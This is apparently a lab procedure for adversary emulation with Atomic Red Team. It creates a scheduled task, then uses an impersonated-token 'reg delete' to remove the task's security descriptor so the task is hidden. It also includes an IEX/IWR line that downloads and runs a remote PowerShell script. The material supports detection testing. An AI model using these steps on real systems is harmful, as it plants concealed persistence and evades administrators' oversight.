## Install Atomic and ATH
```
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord  
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
    Install-AtomicRedTeam -getAtomics -force

    Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
```


## Schedule The Task

`Invoke-AtomicTest T1053.005 -testnumbers 4`

### Confirm SD is present

`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\AtomicTask" /v SD`

Expected result:
(shortened)
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\AtomicTask
    SD    REG_BINARY    01000480880000009800000000000000140000000200740004000000001018009F011F0001020000000000052000
0C4BFFAA9F40100000000000001020000000000052000000020020000010500000000000515000000383FC8419953E150C4BFFAA901020000
```


## Delete the SD

ATH may throw an error, but the SD is still deleted.

```
Invoke-ATHCreateProcessWithToken -ProcessCommandline 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\AtomicTask" /v SD /f'
```

### Validate SD is gone

`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\AtomicTask" /v SD`